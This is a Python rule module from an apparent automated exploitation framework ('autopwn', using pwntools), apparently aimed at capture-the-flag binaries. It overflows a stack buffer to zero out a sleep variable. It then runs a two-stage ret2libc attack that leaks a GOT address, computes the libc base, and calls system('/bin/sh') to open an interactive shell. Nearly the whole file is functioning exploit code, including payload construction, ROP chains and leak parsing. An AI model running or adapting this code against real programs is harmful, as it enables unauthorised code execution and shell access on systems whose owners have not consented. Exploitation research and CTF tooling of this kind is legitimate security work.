"""Rule: bypass sleep(big_number) by overwriting the sleep variable via input."""
from __future__ import annotations

import struct
import time

from pwn import log, flat, p32, p64

from autopwn.agent.state import ActionResult, AttemptRecord
from autopwn.agent.action_utils import open_target, verify_shell, interactive_or_close, safe_close

Rule = tuple  # (name, priority, description, condition_fn, action_fn)


def _condition(state) -> bool:
    return bool(state.discovered_facts.get("sleep_info"))


def _action(state) -> ActionResult:
    """Send input that overwrites sleep variable to 0, then exploit."""
    ctx = state.ctx
    info = state.discovered_facts["sleep_info"]
    overwrite_offset = info["overwrite_offset"]
    read_size = info["read_size"]

    # Build first input: padding + p32(0) to kill sleep
    # read writes to [rbp-read_buf_offset], sleep var at [rbp-sleep_var_offset]
    # overwrite_offset = read_buf_offset - sleep_var_offset
    if ctx.bits == 64:
        sleep_kill = b"A" * overwrite_offset + p32(0)
    else:
        sleep_kill = b"A" * overwrite_offset + p32(0)

    # Pad to read_size to be safe
    if len(sleep_kill) < read_size:
        sleep_kill = sleep_kill.ljust(read_size, b"\x00")

    log.info(f"Agent sleep_bypass: sending {len(sleep_kill)}B to overwrite "
             f"sleep var at offset {overwrite_offset}")

    io = None
    try:
        io = open_target(ctx)
        # Drain initial prompt
        try:
            io.recv(timeout=1)
        except Exception:
            pass

        # Send sleep killer
        io.send(sleep_kill)

        # Wait for sleep(0) to return and program to continue
        time.sleep(0.5)

        # Now the program should be at its next input point
        # Try to recv the next prompt
        try:
            prompt = io.recv(timeout=2)
            log.info(f"Agent sleep_bypass: post-sleep prompt received ({len(prompt)}B)")
        except Exception:
            prompt = b""

        # Now try standard overflow if we have offset
        if ctx.overflow_offset >= 0:
            success = _try_exploit_after_sleep(ctx, io, state)
            if success:
                return ActionResult(
                    success=True,
                    record=AttemptRecord(strategy="sleep_bypass", success=True),
                )

        # If no offset, try to detect it now
        if ctx.overflow_offset < 0:
            # We need to probe for overflow offset post-sleep
            safe_close(io)
            _probe_offset_with_sleep_bypass(ctx, info)
            if ctx.overflow_offset >= 0:
                log.info(f"Agent sleep_bypass: found offset={ctx.overflow_offset} after bypass")
                # Try again with the offset
                io = open_target(ctx)
                try:
                    io.recv(timeout=1)
                except Exception:
                    pass
                io.send(sleep_kill)
                time.sleep(0.5)
                try:
                    io.recv(timeout=2)
                except Exception:
                    pass
                success = _try_exploit_after_sleep(ctx, io, state)
                if success:
                    return ActionResult(
                        success=True,
                        record=AttemptRecord(strategy="sleep_bypass", success=True),
                    )

        safe_close(io)
    except Exception as exc:
        log.debug(f"sleep_bypass error: {exc}")
        if io:
            safe_close(io)

    return ActionResult(
        success=False, terminal=True,
        record=AttemptRecord(strategy="sleep_bypass", diagnosis="sleep_bypassed_but_exploit_failed"),
    )


def _try_exploit_after_sleep(ctx, io, state) -> bool:
    """After bypassing sleep, try ret2libc or ret2win on the second input."""
    from autopwn.exploit.stack.ret2libc import Ret2Libc

    # Try ret2libc (most common post-sleep scenario)
    try:
        # We need to send the overflow payload now
        # But ret2libc expects to manage its own io. So we do it manually.
        word = ctx.bits // 8
        pop_rdi = ctx.find_gadget("pop rdi")
        ret = ctx.find_gadget("ret")

        if not pop_rdi:
            log.debug("sleep_bypass: no pop rdi, can't ret2libc")
            return False

        # Find leak function
        leak_func = None
        leak_plt = 0
        for name in ("puts", "printf"):
            if name in (ctx.plt_table or {}):
                leak_func = name
                leak_plt = ctx.plt_table[name]
                break
        if not leak_func:
            return False

        # Find GOT entry to leak
        got_target = None
        got_addr = 0
        for name in (leak_func, "puts", "printf", "__libc_start_main", "read", "setvbuf"):
            if name in (ctx.got_table or {}):
                got_target = name
                got_addr = ctx.got_table[name]
                break
        if not got_addr:
            return False

        # Find restart target
        restart_addr = 0
        if ctx.elf:
            for name in ("main", "_start"):
                if name in ctx.elf.symbols:
                    restart_addr = ctx.elf.symbols[name]
                    break

        if not restart_addr:
            return False

        offset = ctx.overflow_offset
        pad = b"A" * offset

        # Stage 1: leak
        if ret:
            chain1 = flat([pop_rdi, got_addr, ret, leak_plt, restart_addr])
        else:
            chain1 = flat([pop_rdi, got_addr, leak_plt, restart_addr])

        payload1 = pad + chain1
        io.send(payload1)

        # Parse leak
        leaked = 0
        for _ in range(4):
            try:
                data = io.recvline(timeout=2)
                data = data.strip(b"\n")
                if not data:
                    continue
                data = data.ljust(8 if ctx.bits == 64 else 4, b"\x00")
                if ctx.bits == 64:
                    from pwn import u64
                    addr = u64(data[:8])
                    if 0x7e0000000000 <= addr <= 0x7fffffffffff:
                        leaked = addr
                        break
                else:
                    from pwn import u32
                    addr = u32(data[:4])
                    if 0xf7000000 <= addr <= 0xf7ffffff:
                        leaked = addr
                        break
            except Exception:
                break

        if not leaked:
            log.debug("sleep_bypass: leak failed")
            return False

        log.success(f"Agent sleep_bypass: leaked {got_target} = {leaked:#x}")

        # Resolve libc
        from pwn import ELF
        libc = _resolve_local_libc(ctx, got_target, leaked)
        if not libc:
            return False

        system_addr = libc.symbols.get("system", 0)
        bin_sh = 0
        try:
            bin_sh = next(libc.search(b"/bin/sh\x00"))
        except StopIteration:
            pass

        if not system_addr or not bin_sh:
            return False

        log.info(f"Agent sleep_bypass: system={system_addr:#x}, /bin/sh={bin_sh:#x}")

        # Now we need to re-send the sleep bypass (program restarted)
        # Drain restart prompt
        import time as _time
        try:
            io.recv(timeout=1)
        except Exception:
            pass

        # Re-send sleep bypass
        sleep_info = state.discovered_facts["sleep_info"]
        overwrite_offset = sleep_info["overwrite_offset"]
        read_size = sleep_info["read_size"]
        sleep_kill = b"A" * overwrite_offset + p32(0)
        if len(sleep_kill) < read_size:
            sleep_kill = sleep_kill.ljust(read_size, b"\x00")
        io.send(sleep_kill)
        _time.sleep(0.5)

        try:
            io.recv(timeout=2)
        except Exception:
            pass

        # Stage 2: system("/bin/sh")
        if ret:
            chain2 = flat([ret, pop_rdi, bin_sh, system_addr])
        else:
            chain2 = flat([pop_rdi, bin_sh, system_addr])

        payload2 = pad + chain2
        io.send(payload2)

        if verify_shell(io):
            return interactive_or_close(io, True)

    except Exception as exc:
        log.debug(f"sleep_bypass exploit error: {exc}")

    return False


def _probe_offset_with_sleep_bypass(ctx, sleep_info) -> None:
    """Run offset detection with sleep bypass pre-send."""
    from autopwn.dynamic.offset import find_overflow_offset
    # Temporarily store sleep bypass info so offset prober can use it
    ctx._sleep_bypass_payload = b"A" * sleep_info["overwrite_offset"] + p32(0)
    sz = sleep_info["read_size"]
    if len(ctx._sleep_bypass_payload) < sz:
        ctx._sleep_bypass_payload = ctx._sleep_bypass_payload.ljust(sz, b"\x00")
    try:
        find_overflow_offset(ctx)
    except Exception:
        pass
    ctx._sleep_bypass_payload = None


def _resolve_local_libc(ctx, func_name: str, func_addr: int):
    """Find local libc and set base address."""
    import os
    import re
    import subprocess
    from pwn import ELF

    libc_paths = []
    try:
        result = subprocess.run(["ldd", ctx.binary_path],
                                capture_output=True, timeout=5)
        for line in result.stdout.decode("utf-8", errors="replace").splitlines():
            m = re.search(r"libc\.so\.\d\s+=>\s+(\S+)", line)
            if m:
                libc_paths.append(m.group(1))
    except Exception:
        pass

    libc_paths += [
        "/lib/x86_64-linux-gnu/libc.so.6",
        "/lib/i386-linux-gnu/libc.so.6",
    ]

    for path in libc_paths:
        if not os.path.exists(path):
            continue
        try:
            libc = ELF(path, checksec=False)
            offset = libc.symbols.get(func_name, 0)
            if offset:
                base = func_addr - offset
                if base & 0xfff == 0:
                    libc.address = base
                    ctx.libc = libc
                    ctx.libc_base = base
                    return libc
        except Exception:
            continue
    return None


RULES = [
    ("sleep_bypass", 95, "bypass sleep(big_number) by overwriting sleep var to 0",
     _condition, _action),
]
